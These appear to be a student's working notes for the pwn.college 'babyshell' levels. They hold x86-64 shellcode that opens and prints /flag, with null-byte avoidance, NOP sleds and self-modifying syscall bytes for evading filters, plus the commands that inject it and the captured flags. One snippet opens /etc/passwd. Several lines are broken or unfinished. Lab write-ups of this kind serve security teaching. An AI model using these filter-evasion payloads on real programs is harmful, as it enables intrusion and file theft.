# ssh -i key hacker@dojo.pwn.college

# open.s file
.intel_syntax noprefix
mov BYTE PTR [rsp], '/'
mov BYTE PTR [rsp+1], 'e'
mov BYTE PTR [rsp+2], 't'
mov BYTE PTR [rsp+3], 'c'
mov BYTE PTR [rsp+4], '/'
mov BYTE PTR [rsp+5], 'p'
mov BYTE PTR [rsp+6], 'a'
mov BYTE PTR [rsp+7], 's
mov BYTE PTR [rsp+8], 's'
mov BYTE PTR [rsp+9], 'w'
mov BYTE PTR [rsp+10], 'd'
mov BYTE PTR [rsp+11], '0'
mov rax, 2
mov rdi, rsp
mov rsi, 0
syscall

# s file open, read and write base
.global _start
.intel_syntax noprefix
_start:
    # open files
    mov rsi, 0
    lea rdi, [rip+flag]     #load address of string into rdi -> mov rdi, "/flag"
    mov rax, 2              #syscall 2 opens file
    syscall

    #read files
    mov rdi, rax    #file saved in rax from above syscall
    mov rsi, rsp    #move file to readable register
    mov rdx, 100    # reads 100 bytes
    mov rax, 0
    syscall

    #write files
    mov rdi, 1      #write to stdout
    mov rsi, rsp    #moves file to write 
    mov rdx, rax    #reads # of bytes to write
    mov rax, 1
    syscall

    #exit
    mov rax, 60
    mov rax, 42
    syscall

#\0 is null terminating for strings
flag:
    .ascii "/flag\0"

# alternative flag opening
.global _start
.intel_syntax noprefix
_start:
    
    mov rbx, 0x67616c662f   # file location?
    push rbx                # puts flag on stack


    #open files
    mov rsi, 0
    #lea rdi, [rip+flag]     #load address of string into rdi -> mov rdi, "/flag"
    mov rdi, rsp
    mov rax, 2              #syscall 2 opens file
    syscall

    #read files
    mov rdi, rax    #file saved in rax from above syscall
    mov rsi, rsp    #move file to readable register
    mov rdx, 100    # reads 100 bytes
    mov rax, 0
    syscall

    #write files
    mov rdi, 1      #write to stdout
    mov rsi, rsp    #moves file to write 
    mov rdx, rax    #reads # of bytes to write
    mov rax, 1
    syscall

    #exit
    mov rax, 60
    mov rax, 42
    syscall

#\0 is null terminating for strings
#flag:
    #.ascii "/flag\0"


# python to shell
#!/usr/bin/env python3
from pwn import *

context.arch='x86-64'

my_string = "hello"

my_long_string = """
    line 1
    line 2
    line 3
    """

my_shellcode = asm("""
    mov rdi, 42
    mov ax, 60
    syscall
    """)

with open('/tmp/sc_from_python_land', 'wb') as f:
    f.write(my_shellcode)

#p = gdb.debug('/challenge/babyshell_level1')

p.send(my_shellcode)

p.interactive

# 1
# s file
.global _start
.intel_syntax noprefix
_start:
    # open files
    mov rsi, 0
    lea rdi, [rip+flag]     #load address of string into rdi -> mov rdi, "/flag"
    mov rax, 2              #syscall 2 opens file
    syscall

    #read files
    mov rdi, rax    #file saved in rax from above syscall
    mov rsi, rsp    #move file to readable register
    mov rdx, 100    # reads 100 bytes
    mov rax, 0
    syscall

    #write files
    mov rdi, 1      #write to stdout
    mov rsi, rsp    #moves file to write 
    mov rdx, rax    #reads # of bytes to write
    mov rax, 1
    syscall

    #exit
    mov rax, 60
    mov rax, 42
    syscall

#\0 is null terminating for strings
flag:
    .ascii "/flag\0"

gcc -nostdlib -o solve.elf shell1.s
./solve.elf
objdump -M intel -d solve.elf
objcopy --dump-section .text=solve.bin solve.elf
cat solve.bin | /challenge/babyshell_level1

pwn.college{wFFhDj-LQu_ObeVAAXX_G4tLeMm.QX3EjMscTOxUzW}

# 2
# s file
.global _start
.intel_syntax noprefix
_start:

    .rept 800
    nop
    .endr
    # open files
    mov rsi, 0
    lea rdi, [rip+flag]     #load address of string into rdi -> mov rdi, "/flag"
    mov rax, 2              #syscall 2 opens file
    syscall

    #read files
    mov rdi, rax    #file saved in rax from above syscall
    mov rsi, rsp    #move file to readable register
    mov rdx, 100    # reads 100 bytes
    mov rax, 0
    syscall

    #write files
    mov rdi, 1      #write to stdout
    mov rsi, rsp    #moves file to write 
    mov rdx, rax    #reads # of bytes to write
    mov rax, 1
    syscall

    #exit
    mov rax, 60
    mov rax, 42
    syscall

#\0 is null terminating for strings
flag:
    .ascii "/flag\0"

gcc -nostdlib -o solve.elf shell2.s
./solve.elf
objdump -M intel -d solve.elf
objcopy --dump-section .text=solve.bin solve.elf
cat solve.bin | /challenge/babyshell_level2

pwn.college{ctuc6WBDiBbuJHYb9_Qee11fFzj.QX4EjMscTOxUzW}


# 3 no null bytes -> 00
.global _start
.intel_syntax noprefix
_start:
    # open files
    xor rsi, rsi
    mov BYTE PTR [rsp], '/'
    mov BYTE PTR [rsp+1], 'f'
    mov BYTE PTR [rsp+2], 'l'
    mov BYTE PTR [rsp+3], 'a'
    mov BYTE PTR [rsp+4], 'g'
    xor cl, cl 
    mov BYTE PTR [rsp+5], cl
    mov rdi, rsp
    xor rax, rax
    mov al, 2              #syscall 2 opens file -> was rax, al will result in no null bytes
    syscall

    #read files
    mov rdi, rax    #file saved in rax from above syscall
    mov rsi, rsp    #move file to readable register
    xor rdx, rdx
    mov dl, 100    # reads 100 bytes -> changed for no null bytes
    xor rax, rax
    syscall

    #write files
    xor rdi, rdi
    mov dil, 1      #write to stdout
    mov rsi, rsp    #moves file to write 
    mov rdx, rax    #reads # of bytes to write
    xor rax, rax
    mov al, 1	    # could be inc rax also
    syscall

    #exit
    xor rax, rax
    mov al, 60
    xor rdi, rdi
    mov al, 42
    syscall


gcc -nostdlib -o solve.elf shell3.s
./solve.elf
objdump -M intel -d solve.elf
objcopy --dump-section .text=solve.bin solve.elf
cat solve.bin | /challenge/babyshell_level3

pwn.college{8vDVbOV8ZUKqYqz6PXzS0HrV3IS.QX5EjMscTOxUzW}

# 4 no h bytes -> 48 close just need file reading
# s file

  GNU nano 4.8                                                                       shell4.s                                                                                 
.global _start
.intel_syntax noprefix
_start:
    # open files
    mov esi, 0
    mov BYTE PTR [rsp], 'f'
    xor cl, cl 
    mov BYTE PTR [rsp+1], cl
    mov edi, esp
    mov eax, 2              //syscall 2 opens file
    syscall

    #read files
    mov edi, eax    //file saved in rax from above syscall
    mov esi, esp    //move file to readable register
    mov edx, 100    // reads 100 bytes
    mov eax, 0
    syscall

    #write files
    mov edi, 1      //write to stdout
    mov esi, esp    //moves file to write 
    mov edx, eax    //reads # of bytes to write
    mov eax, 1
    syscall

    #exit
    mov eax, 60
    mov edi, 42
    syscall


gcc -nostdlib -o solve.elf shell4_2.s
./solve.elf
objdump -M intel -d solve.elf
objcopy --dump-section .text=solve.bin solve.elf
cat solve.bin | /challenge/babyshell_level4

strace ./solve.elf
gdb ./solve.elf
    starti
    info proc map
    disp/5i $rip
    si

# 5
.global _start
.intel_syntax noprefix
_start:
    #fix up our syscalls
    mov byte ptr [rip+syscall1], 0x0f
    mov byte ptr [rip+syscall1+1], 0x05
    mov byte ptr [rip+syscall2], 0x0f
    mov byte ptr [rip+syscall2+1], 0x05
    mov byte ptr [rip+syscall3], 0x0f
    mov byte ptr [rip+syscall3+1], 0x05

    # open files
    mov rsi, 0
    lea rdi, [rip+flag]     #load address of string into rdi -> mov rdi, "/flag"
    mov rax, 2              #syscall 2 opens file
syscall1:
    .byte 0x13
    .byte 0x37

    #read files
    mov rdi, rax    #file saved in rax from above syscall
    mov rsi, rsp    #move file to readable register
    mov rdx, 100    # reads 100 bytes
    mov rax, 0
syscall2:
    .byte 0x13
    .byte 0x37

    #write files
    mov rdi, 1      #write to stdout
    mov rsi, rsp    #moves file to write 
    mov rdx, rax    #reads # of bytes to write
    mov rax, 1
syscall3:
    .byte 0x13
    .byte 0x37

    #exit
    mov rax, 60
    mov rax, 42
syscall4:
    .byte 0x13
    .byte 0x37

#\0 is null terminating for strings
flag:
    .ascii "/flag\0"


gcc -nostdlib -o solve.elf shell5.s
./solve.elf
objdump -M intel -d solve.elf
objcopy --dump-section .text=solve.bin solve.elf
cat solve.bin | /challenge/babyshell_level5
pwn.college{AtdbB36V5Z-bC81puuNGpZg0QuS.QXxIjMscTOxUzW}

# 8


# 13
